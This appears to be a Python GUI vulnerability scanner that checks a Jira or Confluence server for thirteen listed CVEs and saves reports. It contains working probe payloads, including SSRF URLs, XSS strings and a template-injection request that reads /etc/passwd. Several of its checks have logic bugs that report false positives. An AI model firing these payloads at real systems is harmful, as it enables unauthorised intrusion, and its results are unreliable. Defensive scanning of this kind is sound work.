import PySimpleGUI as sg
import requests
import sys
import json
import random
import pdfkit
import os
import smtplib
from email.mime.text import MIMEText
from time import sleep
import schedule
import threading

# Complete list of vulnerabilities
vulnerabilities = [
    {
        "id": "CVE-2017-9506",
        "desc": "The IconUriServlet of the Atlassian OAuth Plugin from version 1.3.0 before version 1.9.12 and from version 2.0.0 before version 2.0.4 allows remote attackers to access the content of internal network resources and/or perform an XSS attack via Server Side Request Forgery (SSRF). When running in an environment like Amazon EC2, this flaw can be used to access a metadata resource that provides access credentials and other potentially confidential information.",
        "severity": "high",
        "endpoint": "/plugins/servlet/oauth/users/icon-uri?consumerUri=https://ipinfo.io/json"
    },
    {
        "id": "CVE-2018-20824",
        "desc": "The WallboardServlet resource in Jira before version 7.13.1 allows remote attackers to inject arbitrary HTML or JavaScript via a cross site scripting (XSS) vulnerability in the cyclePeriod parameter.",
        "severity": "medium",
        "endpoint": "/plugins/servlet/Wallboard/?dashboardId=10000&cyclePeriod=alert(document.domain)"
    },
    {
        "id": "CVE-2019-8451",
        "desc": "The /plugins/servlet/gadgets/makeRequest resource in Jira before version 8.4.0 allows remote attackers to access the content of internal network resources via a Server Side Request Forgery (SSRF) vulnerability due to a logic bug in the JiraWhitelist class.",
        "severity": "high",
        "endpoint": "/plugins/servlet/gadgets/makeRequest?url=*@ipinfo.io/json"
    },
    {
        "id": "CVE-2019-8449",
        "desc": "The /rest/api/latest/groupuserpicker resource in Jira before version 8.4.0 allows remote attackers to enumerate usernames via an information disclosure vulnerability.",
        "severity": "low",
        "endpoint": "/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true"
    },
    {
        "id": "CVE-2019-8442",
        "desc": "The CachingResourceDownloadRewriteRule class in Jira before version 7.13.4, and from version 8.0.0 before version 8.0.4, and from version 8.1.0 before version 8.1.1 allows remote attackers to access files in the Jira webroot under the META-INF directory via a lax path access check.",
        "severity": "low",
        "endpoint": "/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
    },
    {
        "id": "CVE-2019-3403",
        "desc": "The /rest/api/2/user/picker rest resource in Jira before version 7.13.3, from version 8.0.0 before version 8.0.4, and from version 8.1.0 before version 8.1.1 allows remote attackers to enumerate usernames via an incorrect authorization check.",
        "severity": "low",
        "endpoint": "/rest/api/2/user/picker?query=admin"
    },
    {
        "id": "CVE-2019-3402",
        "desc": "The ConfigurePortalPages.jspa resource in Jira before version 7.13.3 and from version 8.0.0 before version 8.1.1 allows remote attackers to inject arbitrary HTML or JavaScript via a cross site scripting (XSS) vulnerability in the searchOwnerUser Name parameter.",
        "severity": "medium",
        "endpoint": "/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUser Name=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search"
    },
    {
        "id": "CVE-2019-3396",
        "desc": "The Widget Connector macro in Atlassian Confluence Server before version 6.6.12 (the fixed version for 6.6.x), from version 6.7.0 before 6.12.3 (the fixed version for 6.12.x), from version 6.13.0 before 6.13.3 (the fixed version for 6.13.x), and from version 6.14.0 before 6.14.2 (the fixed version for 6.14.x), allows remote attackers to achieve path traversal and remote code execution on a Confluence Server or Data Center instance via server-side template injection.",
        "severity": "critical",
        "endpoint": "/rest/tinymce/1/macro/preview"
    },
    {
        "id": "CVE-2019-11581",
        "desc": "There was a server-side template injection vulnerability in Jira Server and Data Center, in the ContactAdministrators and the SendBulkMail actions. An attacker is able to remotely execute code on systems that run a vulnerable version of Jira Server or Data Center. All versions of Jira Server and Data Center from 4.4.0 before 7.6.14, from 7.7.0 before 7.13.5, from 8.0.0 before 8.0.3, from 8.1.0 before 8.1.2, and from 8.2.0 before 8.2.3 are affected by this vulnerability.",
        "severity": "critical",
        "endpoint": "/secure/ContactAdministrators!default.jspa"
    },
    {
        "id": "CVE-2020-14179",
        "desc": "Affected versions of Atlassian Jira Server and Data Center allow remote, unauthenticated attackers to view custom field names and custom SLA names via an Information Disclosure vulnerability in the /secure/QueryComponent!Default.jspa endpoint. The affected versions are before version 8.5.8, and from version 8.6.0 before 8.11.1.",
        "severity": "low",
        "endpoint": "/secure/QueryComponent!Default.jspa"
    },
    {
        "id": "CVE-2020-14178",
        "desc": "Affected versions of Atlassian Jira Server and Data Center allow remote attackers to enumerate project keys via an Information Disclosure vulnerability in the /browse.PROJECTKEY endpoint. The affected versions are before version 7.13.7, from version 8.0.0 before 8.5.8, and from version 8.6.0 before 8.12.0.",
        "severity": "low",
        "endpoint": f"/browse.{random.randint(100, 1000000)}"
    },
    {
        "id": "CVE-2020-14181",
        "desc": "Affected versions of Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the /ViewUser Hover.jspa endpoint. The affected versions are before version 7.13.6, from version 8.0.0 before 8.5.7, and from version 8.6.0 before 8.12.0.",
        "severity": "low",
        "endpoint": "/secure/ViewUser Hover.jspa?username=Admin"
    },
    {
        "id": "CVE-2020-36289",
        "desc": "Affected versions of Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the QueryComponentRendererValue!Default.jspa endpoint. The affected versions are before version 8.5.13, from version 8.6.0 before 8.13.5, and from version 8.14.0 before 8.15.1.",
        "severity": "low",
        "endpoint": "/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin"
    }
]

def checkCVE():
    try:
        r = requests.get("https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=Atlassian%20JIRA")
        data = r.json()
        total = data["totalResults"]
        with open("last_total.txt", 'r') as f:
            last_total = f.read()
            last_total = int(last_total)

        if last_total < total:
            with open("last_total.txt", "w") as file:
                file.write(str(total))
            return total - last_total
        else:
            return 0
    except Exception as e:
        sg.popup_error(f"Error checking CVE: {e}")
        return 0

def clean_url(baseUrl):
    while baseUrl.endswith("/"):
        baseUrl = baseUrl[0:-1]
    return baseUrl

def is_valid_url(url):
    try:
        response = requests.get(url)
        return response.status_code == 200
    except Exception as e:
        print(e)
        return False

def findVersion(baseUrl):
    try:
        r = requests.get(f"{baseUrl}/rest/api/latest/serverInfo", allow_redirects=False)
        server_data = json.loads(str(r.content, 'utf-8'))
        data = f'''
        -------- Server Information -----------

        [*] URL --> {server_data.get("baseUrl")}
        [*] Server Title --> {server_data.get("serverTitle")}
        [*] Version --> {server_data.get("version")}
        [*] Deployment Type --> {server_data.get("deploymentType")}
        [*] Build Number --> {server_data.get("buildNumber")}
        [*] Build Date --> {server_data.get("buildDate")}

        '''
        return data
    except Exception as e:
        return f"An Unexpected Error Occurred while fetching version: {e}"

found = []

def checkVuln(id, baseUrl):
    global found
    try:
        endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == id), None)
        r = requests.get(f"{baseUrl}{endpoint}")
        
        if r.status_code == 200:
            if id == "CVE-2017-9506" and "missingauth" in str(r.content):
                found.append(id)
            elif id == "CVE-2018-20824" and "alert(document.domain)" in str(r.content):
                found.append(id)
            elif id == "CVE-2019-8451" and "missingauth" in str(r.content):
                found.append(id)
            elif id == "CVE-2019-8449" and "You are not authenticated. Authentication required to perform this operation." not in str(r.content):
                found.append(id)
            elif id == "CVE-2019-8442" and r.status_code == 200:
                found.append(id)
            elif id == "CVE-2019-3403" and "The user named '{0}' does not exist" or "errorMessages" not in str(r.content):
                found.append(id)
            elif id == "CVE-2019-3402" and "alert(1)" in str(r.content):
                found.append(id)
            elif id == "CVE-2019-3396":
                r = requests.post(f"{baseUrl}{endpoint}", json={"contentId": "1", "macro": {"name": "widget", "params": {"url": "https://www.viddler.com/v/23464dc5", "width": "1000", "height": "1000", "_template": "file:///etc/passwd"}, "body": ""}})
                if "root" in str(r.content):
                    found.append(id)
            elif id == "CVE-2019-11581" and "Your Jira administrator" or "Contact Site Administrators" not in str(r.content):
                found.append(id)
            elif id == "CVE-2020-14179" and r.status_code == 200:
                found.append(id)
            elif id == "CVE-2020-14178" and "Project Does Not Exist" in str(r.content):
                found.append(id)
            elif id == "CVE-2020-14181" and (r.status_code != 200 or "Your session has timed out" in str(r.content)):
                found.append(id)
            elif id == "CVE-2020-36289" and "Assignee" in str(r.content):
                found.append(id)
    except Exception as e:
        sg.popup_error(f"Error checking vulnerability {id}: {e}")

def send_email_notification(vulnerabilities, smtp_server, smtp_port, email, password):
    try:
        msg = MIMEText(f"New vulnerabilities found: {', '.join(vulnerabilities)}")
        msg['Subject'] = 'Jira Scanner Notification'
        msg['From'] = email
        msg['To'] = email  # Send to self for notification

        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(email, password)
            server.send_message(msg)
    except Exception as e:
        sg.popup_error(f"Error sending email notification: {e}")

def scheduled_scan(baseUrl, smtp_server, smtp_port, email, password):
    # Perform the scan and send email notification if vulnerabilities are found
    newCVE = checkCVE()
    if newCVE:
        final = f"{newCVE} new vulnerabilities found since the last time Jira Scanner was run!\n"
    else:
        final = "No new vulnerabilities found since the last time Jira Scanner was run!\n"

    final += f"Scanning started on: {baseUrl}\n"
    for vuln in vulnerabilities:
        checkVuln(vuln["id"], baseUrl)

    if found:
        send_email_notification(found, smtp_server, smtp_port, email, password)

def run_schedule(baseUrl, smtp_server, smtp_port, email, password):
    schedule.every().day.at("10:00").do(scheduled_scan, baseUrl, smtp_server, smtp_port, email, password)
    while True:
        schedule.run_pending()
        sleep(1)

# Start the scheduling in a separate thread
baseUrl = ""
smtp_server = ""
smtp_port = 587  # Default SMTP port
email = ""
email_password = ""

sg.theme('SandyBeach')  # Use change_look_and_feel instead of theme

layout = [ 
    [sg.Text('Enter the Jira URL: ')], 
    [sg.InputText()], 
    [sg.Text('Username: ')],
    [sg.InputText()],
    [sg.Text('Password: ')],
    [sg.InputText(password_char='*')],
    [sg.Text('SMTP Server: ')],
    [sg.InputText()],
    [sg.Text('Email: ')],
    [sg.InputText()],
    [sg.Text('Email Password: ')],
    [sg.InputText(password_char='*')],
    [sg.Text('Scanning Output')],
    [sg.Text(key='-OUTPUT-')],
    [sg.Submit("Ok"), sg.Cancel()] 
] 

window = sg.Window('Jira Scanner', layout, finalize=True) 
event, values = window.read()  

if event == "Cancel":
    print("User  cancelled the operation.")
    window.close()
    sys.exit(1)

url = values[0]
username = values[1]
password = values[2]
smtp_server = values[3]
email = values[4]
email_password = values[5]

if url == "":
    sg.popup_error(f"Usage: python3 {sys.argv[0]} https://jira.target.com")
    event, values = window.read()
    if event == "Error":
        window.close()

if not is_valid_url(url):
    sg.popup_error("Invalid URL provided. Please enter a valid URL.")
    sys.exit(1)

baseUrl = clean_url(url)

newCVE = checkCVE()

if newCVE:
    final = f"{newCVE} new vulnerabilities found since the last time Jira Scanner was run!\n"
else:
    final = "No new vulnerabilities found since the last time Jira Scanner was run!\n"

final += f"Scanning started on: {baseUrl}\n"

window['-OUTPUT-'].update(final)
window.refresh()

# Server Information
final += findVersion(baseUrl)

window['-OUTPUT-'].update(final)
window.refresh()

for vuln in vulnerabilities:
    a = len(found)
    final += f"\nChecking for {vuln['id']}..."
    try:
        checkVuln(vuln["id"], baseUrl)
    except Exception as e:
        sg.popup_error(f"Error checking vulnerability {vuln['id']}: {e}")
    b = len(found)
    if a != b:
        final += " Vulnerable!"
    else:
        final += " Not Vulnerable!"
    window['-OUTPUT-'].update(final)
    window.refresh()

layout1 = [ 
    [sg.Text('How do you want to save the report?\n1. PDF\n2. HTML\n3. JSON\n4. CSV\n5. XML')], 
    [sg.InputText()], 
    [sg.Text('Scanning Output')],
    [sg.Text(key='-OUTPUT-')],
    [sg.Submit("Ok"), sg.Cancel()] 
] 

window1 = sg.Window('Jira Scanner', layout1, finalize=True) 
event1, values1 = window1.read()  

window1.close()

option = values1[0]

if option not in ["1", "2", "3", "4", "5"]:
    sg.popup_error(f"Invalid Option!")
    event, values = window1.read()
    if event == "Error":
        window1.close()
        window.close()

if len(found):
    report = ""
    if option in ["1", "2"]:
        for v in found:
            description = next((vuln["desc"] for vuln in vulnerabilities if vuln["id"] == v), None)
            severity = next((vuln["severity"] for vuln in vulnerabilities if vuln["id"] == v), None)
            endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == v), None)
            report += f"<b>Vulnerability ID</b>: {v} <br><b>Description</b>: {description} <br><b>Severity</b>: {severity}<br><b>URL</b>: <a href='{baseUrl}{endpoint}' target='_blank'>{baseUrl}{endpoint}</a><br><br>"
        name = f"output/{baseUrl.replace('http://','').replace('https://','')}.html"
        with open(name, 'w') as file:
            file.write(f'<p style="font-family:\'Courier New\'">{report}</p>')
        if option == "2":
            final += f"\n\nReport Saved to: {name}"
        elif option == "1":
            pdfkit.from_file(name, f"output/{baseUrl.replace('http://','').replace('https://','')}.pdf")
            os.remove(name)
            final += f"\n\nReport Saved to: output/{baseUrl.replace('http://','').replace('https://','')}.pdf"
    elif option == "3":
        myjson = []
        for v in found:
            description = next((vuln["desc"] for vuln in vulnerabilities if vuln["id"] == v), None)
            severity = next((vuln["severity"] for vuln in vulnerabilities if vuln["id"] == v), None)
            endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == v), None)
            myjson.append(
                {"Vulnerability ID": v, 
                 "Description": description, 
                 "Severity": severity, 
                 "URL": f"{baseUrl}{endpoint}"
                 })
        name = f"output/{baseUrl.replace('http://','').replace('https://','')}.json"
        with open(name, "w") as file:
            json.dump(myjson, file, indent=4)
        final += f"\n\nReport Saved to: output/{baseUrl.replace('http://','').replace('https://','')}.json"
    elif option == "4":  # CSV option
        name = f"output/{baseUrl.replace('http://','').replace('https://','')}.csv"
        with open(name, 'w') as file:
            file.write("Vulnerability ID,Description,Severity,URL\n")
            for v in found:
                description = next((vuln["desc"] for vuln in vulnerabilities if vuln["id"] == v), None)
                severity = next((vuln["severity"] for vuln in vulnerabilities if vuln["id"] == v), None)
                endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == v), None)
                file.write(f"{v},{description},{severity},{baseUrl}{endpoint}\n")
        final += f"\n\nReport Saved to: {name}"
    elif option == "5":  # XML option
        name = f"output/{baseUrl.replace('http://','').replace('https://','')}.xml"
        with open(name, 'w') as file:
            file.write("<vulnerabilities>\n")
            for v in found:
                description = next((vuln["desc"] for vuln in vulnerabilities if vuln["id"] == v), None)
                severity = next((vuln["severity"] for vuln in vulnerabilities if vuln["id"] == v), None)
                endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == v), None)
                file.write(f"  <vulnerability>\n    <id>{v}</id>\n    <description>{description}</description>\n    <severity>{severity}</severity>\n    <url>{baseUrl}{endpoint}</url>\n  </vulnerability>\n")
            file.write("</vulnerabilities>")
        final += f"\n\nReport Saved to: {name}"

else:
    final += "\n\nNo vulnerabilities found."

window['-OUTPUT-'].update(final)
window.refresh()

event, values = window.read()
if event == "Cancel":
    print("User  cancelled the operation.")
    window.close()
    sys.exit(1)

# Start the scheduled scanning in a separate thread
threading.Thread(target=run_schedule, args=(baseUrl, smtp_server, smtp_port, email, email_password)).start()
